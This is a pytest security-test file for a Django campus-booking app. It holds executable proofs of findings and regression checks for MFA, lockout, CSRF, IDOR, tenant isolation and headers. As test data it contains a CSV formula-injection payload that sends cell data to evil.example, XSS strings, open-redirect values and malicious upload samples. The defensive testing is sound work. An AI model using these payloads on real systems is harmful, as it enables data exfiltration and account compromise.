"""
Security review proofs (docs/security-review.md).

Two kinds of test live here:

* ``xfail(strict=True)`` — an executable proof for each exploitable finding (SEC-xx). Each
  one asserts the *secure* behaviour, so it fails today and the suite stays green. When the
  finding is fixed the test starts passing, strict xfail turns that into a failure, and the
  marker must be removed: the proof becomes a regression test.
* Plain tests — regression guards for controls that already work (CSRF, method restriction,
  IDOR → 404, security headers, lockout, MFA gating, demo login off, append-only audit,
  upload validation, output escaping, tenant isolation).

Run:  TEST_DATABASE_NAME=test_edurev_sec python -m pytest tests/test_security.py -q
"""

from __future__ import annotations

import csv
import io
import runpy
import time
import uuid
from datetime import timedelta
from pathlib import Path

import pyotp
import pytest
from django.core.cache import cache
from django.core.exceptions import ValidationError
from django.core.files.uploadedfile import SimpleUploadedFile
from django.db import DatabaseError, transaction
from django.test import Client
from django.urls import reverse
from django.utils import timezone
from PIL import Image

from apps.accounts import mfa
from apps.accounts.manage_views import change_role
from apps.accounts.models import Role, User
from apps.approvals import services as approvals
from apps.approvals.models import ApprovalStep, ApprovalWorkflow, ApproverRole, Decision
from apps.audit.models import AuditLog
from apps.bookings import services as bookings
from apps.bookings.models import BookingStatus
from apps.catalogue.manage_forms import clean_image
from apps.catalogue.models import Resource, ResourceType
from apps.checkins import services as checkins
from apps.checkins.models import NoShow
from apps.core.errors import NotPermitted
from apps.core.models import Institution
from apps.maintenance.models import Severity

from .conftest import at

pytestmark = pytest.mark.django_db

PW = "x-test-password-123"  # conftest.make_user's password
BASE_DIR = Path(__file__).resolve().parent.parent


# ── Fixtures ────────────────────────────────────────────────────────────────


@pytest.fixture(autouse=True)
def _fresh_ratelimit_buckets():
    """django-ratelimit counts in the cache; start every test with empty buckets."""
    cache.clear()
    yield
    cache.clear()


@pytest.fixture
def superadmin(make_user):
    """The seeded admin persona shape: role admin, is_staff + is_superuser (apps/core/demo_data.py)."""
    return make_user(Role.ADMIN, department=None, is_staff=True, is_superuser=True)


@pytest.fixture
def friday(monday):
    return monday - timedelta(days=3)


@pytest.fixture
def booked(student, room, monday, now):
    return bookings.create_booking(
        requester=student, resource=room, start=at(monday, 10), end=at(monday, 11), title="Study", now=now, notify=False
    )


@pytest.fixture
def other_tenant(db):
    """A second institution with its own resource (tenant isolation checks)."""
    inst = Institution.objects.create(code="XYZ", name="Other University")
    rtype = ResourceType.objects.create(
        institution=inst, code="classroom", name="Classroom", plural="Classrooms", category="space"
    )
    resource = Resource.objects.create(institution=inst, type=rtype, code="X-101", name="Room X-101", capacity=30)
    return inst, resource


def _enrol_mfa(user) -> str:
    secret = pyotp.random_base32()
    user.mfa_secret = mfa.encrypt(secret)
    user.mfa_enabled = True
    user.save(update_fields=["mfa_secret", "mfa_enabled"])
    return secret


def _wrong_code(secret: str) -> str:
    totp = pyotp.TOTP(secret)
    valid = {totp.at(time.time() + d) for d in (-60, -30, 0, 30, 60)}
    return next(c for c in ("000000", "111111", "222222", "333333") if c not in valid)


def _password_login(client, user, **extra):
    return client.post(reverse("accounts:login"), {"username": user.username, "password": PW}, **extra)


# ════════════════════════════════════════════════════════════════════════════
#  Executable proofs of open findings (strict xfail: they flip when fixed)
# ════════════════════════════════════════════════════════════════════════════


def test_sec01_django_admin_login_cannot_bypass_mfa(client, superadmin):
    resp = client.post(
        "/django-admin/login/", {"username": superadmin.username, "password": PW, "next": "/django-admin/"}
    )
    assert resp.status_code in (200, 302)
    # The password alone must never yield a session that can open the staff console.
    assert client.get(reverse("manage:home")).status_code != 200


def test_sec01_django_admin_login_is_subject_to_lockout(client, superadmin):
    for _ in range(6):
        client.post("/django-admin/login/", {"username": superadmin.username, "password": "wrong-guess"})
    superadmin.refresh_from_db()
    assert superadmin.is_locked


def test_sec02_student_critical_report_cannot_displace_other_bookings(
    client, monkeypatch, make_user, student, room, friday
):
    fixed_now = at(friday, 9)
    victim = make_user()
    victim_booking = bookings.create_booking(
        requester=victim, resource=room, start=at(friday, 10), end=at(friday, 11), title="Viva", now=fixed_now
    )
    monkeypatch.setattr(timezone, "now", lambda: fixed_now)
    client.force_login(student)
    client.post(
        reverse("maintenance:report", args=[room.slug]),
        {"summary": "Projector is smoking", "severity": Severity.CRITICAL},
    )
    victim_booking.refresh_from_db()
    room.refresh_from_db()
    # An unverified report from any user should alert custodians, not cancel other people's bookings.
    assert victim_booking.status == BookingStatus.APPROVED
    assert room.status == "active"


@pytest.mark.xfail(strict=True, reason="SEC-03: re-entering the password resets the MFA failure counter")
def test_sec03_mfa_failures_survive_password_reentry(client, admin_user):
    secret = _enrol_mfa(admin_user)
    wrong = _wrong_code(secret)
    assert _password_login(client, admin_user).url == reverse("accounts:mfa")
    for _ in range(4):
        client.post(reverse("accounts:mfa"), {"code": wrong})
    _password_login(client, admin_user)  # attacker knows the password: counter goes back to 0 today
    client.post(reverse("accounts:mfa"), {"code": wrong})  # 5th wrong TOTP guess overall
    admin_user.refresh_from_db()
    assert admin_user.is_locked


def test_sec04_approver_cannot_decide_own_request(lpu, custodian, room, room_type, monday, now):
    wf = ApprovalWorkflow.objects.create(institution=lpu, name="Custodian check", resource_type=room_type)
    ApprovalStep.objects.create(workflow=wf, order=1, approver_role=ApproverRole.CUSTODIAN)
    own = bookings.create_booking(
        requester=custodian,
        resource=room,
        start=at(monday, 10),
        end=at(monday, 11),
        title="Mine",
        now=now,
        notify=False,
    )
    assert own.status == BookingStatus.PENDING
    step = own.approvals.get(decision=Decision.PENDING)
    assert not approvals.can_decide(custodian, step)


def test_sec04_custodian_cannot_forgive_own_no_show(lpu, custodian, room, monday, now):
    own = bookings.create_booking(
        requester=custodian,
        resource=room,
        start=at(monday, 10),
        end=at(monday, 11),
        title="Mine",
        now=now,
        notify=False,
    )
    ns = NoShow.objects.create(institution=lpu, booking=own, user=custodian, resource=room, detected_at=now)
    with pytest.raises(NotPermitted):
        checkins.forgive(ns, custodian, "It was me", now=now)


def test_sec05_production_settings_refuse_default_secret_key(monkeypatch):
    import environ

    monkeypatch.setattr(environ.Env, "read_env", lambda *a, **k: None)
    monkeypatch.delenv("DJANGO_SECRET_KEY", raising=False)
    monkeypatch.setenv("DEBUG", "0")
    with pytest.raises(Exception):  # noqa: B017 - ImproperlyConfigured or similar is the fix
        runpy.run_path(str(BASE_DIR / "config" / "settings.py"))


@pytest.mark.xfail(strict=True, reason="SEC-06: audit-log CSV export writes user text without formula neutralising")
def test_sec06_audit_csv_export_neutralises_formulas(client, student, facility_manager, room):
    payload = '=HYPERLINK("https://evil.example/?x="&A1,"Open")'
    client.force_login(student)
    client.post(reverse("maintenance:report", args=[room.slug]), {"summary": payload, "severity": Severity.LOW})
    client.force_login(facility_manager)
    resp = client.get(reverse("manage:audit"), {"format": "csv"})
    text = b"".join(resp.streaming_content).decode()
    rows = [r for r in csv.reader(io.StringIO(text)) if len(r) > 5 and r[2] == "maintenance.report"]
    assert rows, "the breakdown report should be in the audit export"
    assert not rows[0][5].startswith(("=", "+", "-", "@"))


@pytest.mark.xfail(strict=True, reason="SEC-07: audit IP is taken from a client-supplied X-Forwarded-For")
def test_sec07_audit_ip_is_not_client_controlled(client, student):
    _password_login(client, student, HTTP_X_FORWARDED_FOR="203.0.113.66")
    entry = AuditLog.objects.filter(action="auth.login", actor=student).latest("created_at")
    assert entry.ip != "203.0.113.66"


@pytest.mark.xfail(strict=True, reason="SEC-08: quadratic-time regex in catalogue.search.parse on long ?q=")
def test_sec08_find_query_parsing_is_bounded(client, student):
    client.force_login(student)
    client.get(reverse("catalogue:find"))  # warm up
    started = time.perf_counter()
    client.get(reverse("catalogue:find"), {"q": "1:00" + " " * 25_000 + "x"})
    assert time.perf_counter() - started < 1.5


@pytest.mark.xfail(strict=True, reason="SEC-09: MFA enrolment page (shows the TOTP secret) is cacheable")
def test_sec09_mfa_enrolment_page_is_not_cacheable(client, admin_user):
    _password_login(client, admin_user)
    resp = client.get(reverse("accounts:mfa"))
    assert resp.status_code == 200 and b"mfa-key" in resp.content
    assert "no-store" in resp.get("Cache-Control", "")


@pytest.mark.xfail(strict=True, reason="SEC-09: the DPDP personal-data export is cacheable")
def test_sec09_personal_data_export_is_not_cacheable(client, student):
    client.force_login(student)
    resp = client.get(reverse("accounts:export"))
    assert resp.status_code == 200
    assert "no-store" in resp.get("Cache-Control", "")


@pytest.mark.xfail(strict=True, reason="SEC-10: lockout message reveals that an account exists")
def test_sec10_locked_and_unknown_accounts_answer_alike(client, student):
    student.locked_until = timezone.now() + timedelta(minutes=10)
    student.save(update_fields=["locked_until"])
    locked = client.post(reverse("accounts:login"), {"username": student.username, "password": "guess"})
    unknown = client.post(reverse("accounts:login"), {"username": "nobody-here", "password": "guess"})
    assert b"locked" not in locked.content.lower()
    assert locked.status_code == unknown.status_code


def test_sec11_totp_code_cannot_be_replayed(client, admin_user):
    secret = _enrol_mfa(admin_user)
    code = pyotp.TOTP(secret).now()
    _password_login(client, admin_user)
    assert client.post(reverse("accounts:mfa"), {"code": code}).status_code == 302
    client.post(reverse("accounts:logout"))
    _password_login(client, admin_user)
    replay = client.post(reverse("accounts:mfa"), {"code": code})
    assert replay.status_code == 200  # refused, re-rendered with an error


def test_sec12_role_elevation_requires_mfa_step_up(client, student, admin_user):
    client.force_login(student)  # an ordinary, MFA-less student session
    change_role(student, Role.ADMIN, actor=admin_user)
    assert client.get(reverse("manage:users")).status_code != 200


@pytest.mark.parametrize("case", ["resource_date_overflow", "series_non_numeric", "users_non_numeric"])
def test_sec13_malformed_input_is_a_4xx_not_a_500(client, room, faculty, admin_user, case):
    client.raise_request_exception = False
    if case == "resource_date_overflow":
        client.force_login(faculty)
        resp = client.get(reverse("catalogue:detail", args=[room.slug]), {"date": "0001-01-01"})
    elif case == "series_non_numeric":
        client.force_login(faculty)
        resp = client.get(reverse("bookings:series_new"), {"series": "abc"})
    else:
        client.force_login(admin_user)
        resp = client.post(reverse("manage:users"), {"user": "abc", "action": "deactivate"})
    assert resp.status_code < 500


@pytest.mark.parametrize("path", ["/api/v1/schema/", "/api/v1/docs/"])
def test_sec14_api_schema_requires_authentication(client, path):
    assert client.get(path).status_code in (401, 403, 302)


# ════════════════════════════════════════════════════════════════════════════
#  Behaviour that the fixes above introduced
# ════════════════════════════════════════════════════════════════════════════

# ── SEC-01: Django admin signs in through the product's own view ────────────


def test_sec01_django_admin_login_sends_privileged_staff_to_mfa(client, superadmin):
    resp = client.post(
        "/django-admin/login/", {"username": superadmin.username, "password": PW, "next": "/django-admin/"}
    )
    assert resp.status_code == 302 and resp.url == reverse("accounts:mfa")
    assert client.session["mfa_next"] == "/django-admin/"


def test_sec01_django_admin_login_page_is_the_product_sign_in(client):
    resp = client.get("/django-admin/login/", {"next": "/django-admin/"})
    assert resp.status_code == 200
    assert "accounts/login.html" in [t.name for t in resp.templates]


def test_sec01_signed_in_non_admin_gets_403_not_a_redirect_loop(client, student):
    client.force_login(student)
    assert client.get("/django-admin/login/", {"next": "/django-admin/"}).status_code == 403


def test_sec01_admin_staff_already_signed_in_continue_to_admin(client, superadmin):
    client.force_login(superadmin)
    resp = client.get("/django-admin/login/", {"next": "/django-admin/"})
    assert resp.status_code == 302 and resp.url == "/django-admin/"


# ── SEC-02: only someone who manages a resource takes it out of service ─────


def test_sec02_student_critical_report_alerts_custodian_to_confirm(student, custodian, room):
    from apps.maintenance import services as maintenance
    from apps.notifications.models import Kind, Notification

    report = maintenance.report_breakdown(room, student, summary="Projector is smoking", severity=Severity.CRITICAL)
    room.refresh_from_db()
    assert room.status == "active" and report.window is None
    assert report.awaiting_confirmation
    n = Notification.objects.get(user=custodian, kind=Kind.BREAKDOWN)
    assert "confirm" in n.title.lower()


def test_sec02_custodian_confirms_and_the_resource_goes_offline(student, custodian, room, now):
    from apps.maintenance import services as maintenance

    report = maintenance.report_breakdown(room, student, summary="Projector is smoking", severity=Severity.CRITICAL)
    maintenance.confirm_critical(report, custodian, now=now)
    report.refresh_from_db()
    room.refresh_from_db()
    assert room.status == "out_of_service"
    assert report.confirmed_by == custodian and report.window is not None
    assert AuditLog.objects.filter(action="maintenance.confirm_critical", target_id=str(report.pk)).exists()
    with pytest.raises(Exception, match="already been confirmed"):
        maintenance.confirm_critical(report, custodian, now=now)


def test_sec02_only_a_manager_of_the_resource_can_confirm(make_user, student, room, now):
    from apps.maintenance import services as maintenance

    report = maintenance.report_breakdown(room, student, summary="Smoke", severity=Severity.CRITICAL)
    for outsider in (student, make_user(Role.CUSTODIAN), make_user(Role.FACULTY)):
        with pytest.raises(NotPermitted):
            maintenance.confirm_critical(report, outsider, now=now)
    room.refresh_from_db()
    assert room.status == "active"


def test_sec02_custodian_own_critical_report_takes_effect_at_once(custodian, room):
    from apps.maintenance import services as maintenance

    report = maintenance.report_breakdown(room, custodian, summary="Ceiling leak", severity=Severity.CRITICAL)
    room.refresh_from_db()
    assert room.status == "out_of_service" and report.confirmed_by == custodian


def test_sec02_unconfirmed_report_does_not_keep_a_resource_offline(student, custodian, room):
    from apps.maintenance import services as maintenance

    confirmed = maintenance.report_breakdown(room, custodian, summary="Ceiling leak", severity=Severity.CRITICAL)
    maintenance.report_breakdown(room, student, summary="Also smells odd", severity=Severity.CRITICAL)
    maintenance.resolve(confirmed, custodian, "Roof patched")
    room.refresh_from_db()
    assert room.status == "active"


def test_sec02_console_confirm_action(client, student, custodian, room):
    from apps.maintenance import services as maintenance

    report = maintenance.report_breakdown(room, student, summary="Smoke", severity=Severity.CRITICAL)
    client.force_login(custodian)
    page = client.get(reverse("manage:maintenance"))
    assert reverse("manage:maintenance_report", args=[report.pk, "confirm"]).encode() in page.content
    resp = client.post(reverse("manage:maintenance_report", args=[report.pk, "confirm"]))
    assert resp.status_code == 302
    room.refresh_from_db()
    assert room.status == "out_of_service"


# ── SEC-04: separation of duties ────────────────────────────────────────────


def test_sec04_own_requests_never_reach_the_approvers_queue(lpu, custodian, facility_manager, room, room_type, monday):
    wf = ApprovalWorkflow.objects.create(institution=lpu, name="FM check", resource_type=room_type)
    ApprovalStep.objects.create(workflow=wf, order=1, approver_role=ApproverRole.CUSTODIAN)
    fm_now = at(monday - timedelta(days=3), 9)
    own = bookings.create_booking(
        requester=facility_manager, resource=room, start=at(monday, 10), end=at(monday, 11), title="FM", now=fm_now
    )
    assert own.status == BookingStatus.PENDING
    assert own.pk not in {a.booking_id for a in approvals.queue_for(facility_manager)}  # campus-wide, still excluded
    assert own.pk in {a.booking_id for a in approvals.queue_for(custodian)}
    step = own.approvals.get(decision=Decision.PENDING)
    with pytest.raises(NotPermitted):
        approvals.decide(step, facility_manager, approve=True, now=fm_now)
    approvals.decide(step, custodian, approve=True, now=fm_now)
    own.refresh_from_db()
    assert own.status == BookingStatus.APPROVED


def test_sec04_staff_cannot_lift_their_own_restriction(lpu, facility_manager, now):
    from apps.checkins.models import Restriction

    r = Restriction.objects.create(
        institution=lpu, user=facility_manager, starts_at=now, ends_at=now + timedelta(days=7), reason="3 no-shows"
    )
    with pytest.raises(NotPermitted):
        checkins.lift_restriction(r, facility_manager)
    r.refresh_from_db()
    assert r.lifted_at is None


# ── SEC-05: production settings need a real secret key ──────────────────────


def _load_settings(monkeypatch, **env):
    import environ

    monkeypatch.setattr(environ.Env, "read_env", lambda *a, **k: None)
    for key in ("DJANGO_SECRET_KEY", "DEBUG", "DEMO_MODE"):
        monkeypatch.delenv(key, raising=False)
    for key, value in env.items():
        monkeypatch.setenv(key, value)
    return runpy.run_path(str(BASE_DIR / "config" / "settings.py"))


@pytest.mark.parametrize(
    "key",
    [
        "replace-me-with-a-long-random-string",
        "too-short-key",
        "django-insecure-" + "x" * 40,
        "dev-only-insecure-compose-key-never-use-in-production",
    ],
)
def test_sec05_production_refuses_placeholder_and_weak_keys(monkeypatch, key):
    from django.core.exceptions import ImproperlyConfigured

    with pytest.raises(ImproperlyConfigured):
        _load_settings(monkeypatch, DEBUG="0", DJANGO_SECRET_KEY=key)


def test_sec05_production_accepts_a_real_key(monkeypatch):
    key = "k" * 10 + uuid.uuid4().hex + uuid.uuid4().hex
    assert _load_settings(monkeypatch, DEBUG="0", DJANGO_SECRET_KEY=key)["SECRET_KEY"] == key


def test_sec05_public_compose_key_is_tolerated_only_on_a_demo_stack(monkeypatch):
    key = "dev-only-insecure-compose-key-never-use-in-production"
    assert _load_settings(monkeypatch, DEBUG="0", DEMO_MODE="1", DJANGO_SECRET_KEY=key)["SECRET_KEY"] == key


def test_sec05_debug_keeps_the_zero_config_dev_key(monkeypatch):
    assert _load_settings(monkeypatch, DEBUG="1")["SECRET_KEY"] == "dev-only-insecure-key-change-me"


# ── SEC-11: a TOTP code works once ──────────────────────────────────────────


def test_sec11_replayed_code_is_refused_with_a_clear_message(client, admin_user):
    secret = _enrol_mfa(admin_user)
    code = pyotp.TOTP(secret).now()
    _password_login(client, admin_user)
    client.post(reverse("accounts:mfa"), {"code": code})
    client.post(reverse("accounts:logout"))
    _password_login(client, admin_user)
    resp = client.post(reverse("accounts:mfa"), {"code": code})
    assert b"already been used" in resp.content
    admin_user.refresh_from_db()
    assert admin_user.failed_logins == 1  # a replay counts towards the lockout


def test_sec11_the_enrolment_code_cannot_be_reused_to_sign_in(client, admin_user):
    _password_login(client, admin_user)
    client.get(reverse("accounts:mfa"))  # the enrolment page creates the secret
    secret = mfa.decrypt(client.session["mfa_new_secret"])
    code = pyotp.TOTP(secret).now()
    assert client.post(reverse("accounts:mfa"), {"code": code}).status_code == 302
    client.post(reverse("accounts:logout"))
    _password_login(client, admin_user)
    assert client.post(reverse("accounts:mfa"), {"code": code}).status_code == 200


def test_sec11_consume_step_is_monotonic(admin_user):
    assert mfa.consume_step(admin_user, 1000)
    assert not mfa.consume_step(admin_user, 1000)
    assert not mfa.consume_step(admin_user, 999)
    assert mfa.consume_step(admin_user, 1001)


# ── SEC-12: sessions of people who need MFA must have passed it ─────────────


def test_sec12_full_mfa_sign_in_keeps_working(client, admin_user):
    secret = _enrol_mfa(admin_user)
    _password_login(client, admin_user)
    client.post(reverse("accounts:mfa"), {"code": pyotp.TOTP(secret).now()})
    assert client.session[mfa.SESSION_KEY] == admin_user.pk
    assert client.get(reverse("manage:users")).status_code == 200


def test_sec12_elevated_session_is_ended_and_recorded(client, student, admin_user):
    client.force_login(student)
    change_role(student, Role.ADMIN, actor=admin_user)
    resp = client.get(reverse("manage:users"))
    assert resp.status_code == 302 and resp.url.startswith(reverse("accounts:login"))
    assert "_auth_user_id" not in client.session
    assert AuditLog.objects.filter(action="auth.mfa_step_up", actor=student).exists()


def test_sec12_elevated_api_session_gets_a_401_envelope(client, student, admin_user):
    client.force_login(student)
    change_role(student, Role.ADMIN, actor=admin_user)
    resp = client.get("/api/v1/me/")
    assert resp.status_code == 401
    assert resp.json()["error"]["code"] == "mfa_required"


def test_sec12_voluntary_enrolment_is_enforced_too(client, custodian):
    client.force_login(custodian)  # signed in before enrolling
    assert client.get(reverse("manage:home")).status_code == 200
    _enrol_mfa(custodian)
    assert client.get(reverse("manage:home")).status_code == 302


def test_sec12_demo_stamp_is_void_once_demo_mode_is_off(client, settings, admin_user):
    from django.contrib.auth import SESSION_KEY

    settings.DEMO_MODE = True
    client.force_login(admin_user)
    session = client.session
    session[mfa.SESSION_KEY] = mfa.DEMO_MARKER
    session.save()
    assert client.get(reverse("manage:users")).status_code == 200
    settings.DEMO_MODE = False
    assert client.get(reverse("manage:users")).status_code == 302
    assert SESSION_KEY not in client.session


# ── SEC-14: the live API schema is for signed-in users ──────────────────────


@pytest.mark.parametrize("path", ["/api/v1/schema/", "/api/v1/docs/"])
def test_sec14_signed_in_users_can_read_the_api_schema(client, student, path):
    client.force_login(student)
    assert client.get(path).status_code == 200


# ════════════════════════════════════════════════════════════════════════════
#  Regression guards for controls that work today
# ════════════════════════════════════════════════════════════════════════════

# ── CSRF and method restriction ─────────────────────────────────────────────


def test_csrf_is_enforced_on_state_changing_views(student, booked):
    c = Client(enforce_csrf_checks=True)
    c.force_login(student)
    assert c.post(reverse("bookings:cancel", args=[booked.reference])).status_code == 403
    assert c.post(reverse("accounts:logout")).status_code == 403
    booked.refresh_from_db()
    assert booked.status == BookingStatus.APPROVED


def test_csrf_is_enforced_on_the_session_authenticated_api(student, room, monday):
    c = Client(enforce_csrf_checks=True)
    c.force_login(student)
    resp = c.post(
        "/api/v1/bookings/",
        {"resource": room.pk, "start": at(monday, 10).isoformat(), "end": at(monday, 11).isoformat()},
        content_type="application/json",
    )
    assert resp.status_code == 403


def test_csrf_is_enforced_on_login(student):
    c = Client(enforce_csrf_checks=True)
    assert _password_login(c, student).status_code == 403


@pytest.mark.parametrize(
    "name,args",
    [
        ("accounts:logout", []),
        ("accounts:demo_login", []),
        ("bookings:cancel", ["LR-AAAAAA"]),
        ("checkins:check_in", ["LR-AAAAAA"]),
        ("checkins:check_out", ["LR-AAAAAA"]),
        ("catalogue:save", ["any-slug"]),
        ("maintenance:report", ["any-slug"]),
        ("notifications:read_all", []),
        ("manage:approval_decide", [1]),
        ("manage:no_show_forgive", [1]),
        ("manage:restriction_lift", [1]),
        ("manage:inventory_restock", [1]),
        ("manage:maintenance_window", [1, "cancel"]),
        ("manage:maintenance_report", [1, "resolve"]),
    ],
)
def test_state_changing_views_refuse_get(client, admin_user, name, args):
    client.force_login(admin_user)
    assert client.get(reverse(name, args=args)).status_code == 405


# ── Object-level access (IDOR → 404) and tenant isolation ───────────────────


@pytest.mark.parametrize("name", ["bookings:detail", "bookings:ics"])
def test_other_peoples_bookings_are_404(client, make_user, booked, name):
    client.force_login(make_user())
    assert client.get(reverse(name, args=[booked.reference])).status_code == 404


@pytest.mark.parametrize("name", ["bookings:cancel", "checkins:check_in", "checkins:check_out"])
def test_other_peoples_bookings_cannot_be_changed(client, make_user, booked, name):
    client.force_login(make_user())
    assert client.post(reverse(name, args=[booked.reference])).status_code == 404
    booked.refresh_from_db()
    assert booked.status == BookingStatus.APPROVED


def test_api_booking_lookup_is_scoped(client, make_user, booked):
    client.force_login(make_user())
    assert client.get(f"/api/v1/bookings/{booked.reference}/").status_code == 404
    assert client.post(f"/api/v1/bookings/{booked.reference}/cancel/", {}, "application/json").status_code == 404


def test_pass_token_is_only_shown_to_the_booked_person(client, custodian, booked):
    client.force_login(custodian)  # manages the room, can see the booking
    body = client.get(f"/api/v1/bookings/{booked.reference}/").json()
    assert body["reference"] == booked.reference
    assert body["qr_token"] is None


def test_foreign_pass_reveals_no_personal_data(client, make_user, room, monday, now):
    owner = make_user(first_name="Zorawar", last_name="Uniquesurname", vid="98765432")
    b = bookings.create_booking(
        requester=owner,
        resource=room,
        start=at(monday, 16),
        end=at(monday, 17),
        title="Private viva",
        now=now,
        notify=False,
    )
    client.force_login(make_user())
    resp = client.get(reverse("checkins:pass", args=[b.qr_token]))
    assert resp.status_code == 200
    for secret in (b"Uniquesurname", b"98765432", b"Private viva", b.reference.encode()):
        assert secret not in resp.content


def test_unknown_calendar_feed_token_is_404(client, booked):
    assert client.get(reverse("bookings:feed", args=[uuid.uuid4()])).status_code == 404


def test_other_tenants_resources_are_invisible(client, student, other_tenant):
    _, foreign = other_tenant
    client.force_login(student)
    assert client.get(reverse("catalogue:detail", args=[foreign.slug])).status_code == 404
    assert client.get(reverse("checkins:here", args=[foreign.code])).status_code == 404
    assert client.get(f"/api/v1/resources/{foreign.pk}/").status_code == 404
    assert client.post(reverse("maintenance:report", args=[foreign.slug]), {"summary": "x"}).status_code == 404


def test_api_cannot_book_another_tenants_resource(client, faculty, other_tenant, monday):
    _, foreign = other_tenant
    client.force_login(faculty)
    resp = client.post(
        "/api/v1/bookings/",
        {"resource": foreign.pk, "start": at(monday, 10).isoformat(), "end": at(monday, 11).isoformat()},
        content_type="application/json",
    )
    assert resp.status_code == 400


def test_students_cannot_book_on_behalf_or_mass_assign(client, student, make_user, room, monday):
    other = make_user()
    client.force_login(student)
    resp = client.post(
        "/api/v1/bookings/",
        {
            "resource": room.pk,
            "start": at(monday, 10).isoformat(),
            "end": at(monday, 11).isoformat(),
            "booked_for": other.username,
        },
        content_type="application/json",
    )
    assert resp.status_code == 403
    resp = client.post(
        "/api/v1/bookings/",
        {
            "resource": room.pk,
            "start": at(monday, 12).isoformat(),
            "end": at(monday, 13).isoformat(),
            "status": "checked_in",
            "requester": other.pk,
        },
        content_type="application/json",
    )
    assert resp.status_code == 201
    body = resp.json()
    assert body["status"] == BookingStatus.APPROVED
    assert body["requester"] == student.display_name


# ── RBAC on the staff console ───────────────────────────────────────────────


@pytest.mark.parametrize(
    "name",
    ["manage:home", "manage:approvals", "manage:resources", "manage:users", "manage:audit", "manage:ops"],
)
def test_students_are_refused_by_the_console(client, student, name):
    client.force_login(student)
    assert client.get(reverse(name)).status_code == 403


def test_only_user_managers_change_roles(client, facility_manager, student):
    client.force_login(facility_manager)
    resp = client.post(reverse("manage:users"), {"user": student.pk, "action": "role", "role": Role.ADMIN})
    assert resp.status_code == 403
    student.refresh_from_db()
    assert student.role == Role.STUDENT


def test_custodians_cannot_open_other_resources_in_the_console(client, custodian, room2):
    client.force_login(custodian)
    assert client.get(reverse("manage:resource_edit", args=[room2.pk])).status_code == 404
    assert client.get(reverse("manage:door_qr", args=[room2.pk])).status_code == 404


# ── Authentication: lockout, MFA gating, demo login, redirects ──────────────


def test_password_lockout_after_five_failures(client, student):
    for _ in range(5):
        client.post(reverse("accounts:login"), {"username": student.username, "password": "wrong"})
    student.refresh_from_db()
    assert student.is_locked
    _password_login(client, student)
    assert "_auth_user_id" not in client.session


def test_privileged_password_login_does_not_create_a_session(client, admin_user):
    resp = _password_login(client, admin_user)
    assert resp.status_code == 302 and resp.url == reverse("accounts:mfa")
    assert "_auth_user_id" not in client.session
    assert client.get(reverse("manage:home")).status_code == 302  # back to sign-in


def test_mfa_code_completes_sign_in_and_rotates_the_session(client, admin_user):
    secret = _enrol_mfa(admin_user)
    _password_login(client, admin_user)
    pre_mfa_key = client.session.session_key
    resp = client.post(reverse("accounts:mfa"), {"code": pyotp.TOTP(secret).now()})
    assert resp.status_code == 302
    assert client.session.get("_auth_user_id") == str(admin_user.pk)
    assert client.session.session_key != pre_mfa_key  # no session fixation across the MFA step


def test_five_wrong_mfa_codes_lock_the_account(client, admin_user):
    secret = _enrol_mfa(admin_user)
    wrong = _wrong_code(secret)
    _password_login(client, admin_user)
    for _ in range(5):
        client.post(reverse("accounts:mfa"), {"code": wrong})
    admin_user.refresh_from_db()
    assert admin_user.is_locked
    assert "_auth_user_id" not in client.session


def test_mfa_page_without_a_pending_password_step_goes_to_login(client):
    resp = client.get(reverse("accounts:mfa"))
    assert resp.status_code == 302 and resp.url == reverse("accounts:login")


def test_demo_login_is_off_by_default(client, settings, superadmin):
    assert settings.DEMO_MODE is False
    superadmin.username = "admin"
    superadmin.save(update_fields=["username"])
    assert client.post(reverse("accounts:demo_login"), {"username": "admin"}).status_code == 404
    assert "_auth_user_id" not in client.session


@pytest.mark.parametrize("nxt", ["https://evil.example/", "//evil.example/", "/\\evil.example/"])
def test_login_refuses_open_redirects(client, student, nxt):
    resp = client.post(
        reverse("accounts:login") + f"?next={nxt}", {"username": student.username, "password": PW, "next": nxt}
    )
    assert resp.status_code == 302
    assert "evil.example" not in resp.url


def test_post_actions_refuse_open_redirect_in_next(client, student, booked):
    client.force_login(student)
    resp = client.post(reverse("checkins:check_in", args=[booked.reference]), {"next": "https://evil.example/"})
    assert resp.status_code == 302
    assert "evil.example" not in resp.url


# ── Headers and cookies ─────────────────────────────────────────────────────


def test_security_headers_are_present(client):
    resp = client.get(reverse("accounts:login"))
    csp = resp["Content-Security-Policy"]
    assert "default-src 'self'" in csp and "script-src 'self'" in csp and "frame-ancestors 'none'" in csp
    assert "unsafe-inline" not in csp.split("script-src")[1].split(";")[0]
    assert resp["X-Frame-Options"] == "DENY"
    assert resp["X-Content-Type-Options"] == "nosniff"
    assert resp["Referrer-Policy"] == "same-origin"
    assert resp["Cross-Origin-Opener-Policy"] == "same-origin"
    assert "camera=(self)" in resp["Permissions-Policy"]


def test_session_and_csrf_cookie_flags(settings):
    assert settings.SESSION_COOKIE_HTTPONLY is True
    assert settings.SESSION_COOKIE_SAMESITE == "Lax"
    assert settings.CSRF_COOKIE_SAMESITE == "Lax"
    assert settings.SESSION_COOKIE_AGE <= 12 * 3600


def test_health_probes_reveal_no_internals(client):
    body = client.get("/ready/").json()
    assert set(body) == {"status", "checks"}
    assert all(set(c) <= {"status", "error", "ms"} for c in body["checks"].values())


# ── Output encoding (XSS) ───────────────────────────────────────────────────


def test_user_text_is_escaped_on_the_pass(client, student, room, monday, now):
    b = bookings.create_booking(
        requester=student,
        resource=room,
        start=at(monday, 14),
        end=at(monday, 15),
        title='<script>alert(1)</script>"><img src=x onerror=alert(2)>',
        now=now,
        notify=False,
    )
    client.force_login(student)
    resp = client.get(reverse("bookings:detail", args=[b.reference]))
    assert b"<script>alert(1)" not in resp.content
    assert b"<img src=x" not in resp.content
    assert b"&lt;script&gt;" in resp.content


def test_search_echo_is_escaped(client, student):
    client.force_login(student)
    resp = client.get(reverse("catalogue:find"), {"q": '"><svg onload=alert(1)>'})
    assert b"<svg onload=alert(1)>" not in resp.content


# ── File upload validation ──────────────────────────────────────────────────


def _png_bytes():
    buf = io.BytesIO()
    Image.new("RGB", (8, 8), (200, 10, 10)).save(buf, "PNG")
    return buf.getvalue()


@pytest.mark.parametrize(
    "name,content,ctype",
    [
        ("evil.svg", b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', "image/svg+xml"),
        ("evil.png", b"<html><script>alert(1)</script></html>", "image/png"),
        ("evil.png", b"\x89PNG\r\n\x1a\n" + b"not really a png", "image/png"),
        ("evil.html", _png_bytes(), "text/html"),
    ],
)
def test_photo_upload_rejects_non_images(name, content, ctype):
